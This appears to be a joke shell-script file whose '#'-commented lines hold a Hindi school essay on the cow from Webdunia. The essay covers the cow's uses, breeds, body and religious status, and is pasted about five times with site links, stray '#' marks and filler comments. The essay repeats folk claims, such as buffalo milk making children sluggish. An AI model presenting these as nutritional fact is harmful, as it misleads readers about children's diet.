#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा





#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#यदि समझ आ गया तो अब सो जाओ







clear
























































#स्वगत है मेरा script में
































#आज हम सीखेंगे की गाय किसी कहते है ओर उसी के विषय मे सब कुछ



















#ओर नीचे आओ













#👇👇




































#👇👇👇👇










































































#👇👇👇👇👇👇👇👇👇👇👇








































































#यदि देखने का मन नही है तो मत देखो










































#👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
















































#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा








#फिर से पढ़ लो











#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा




#गाय पर हिन्दी में निबंध


#Webdunia
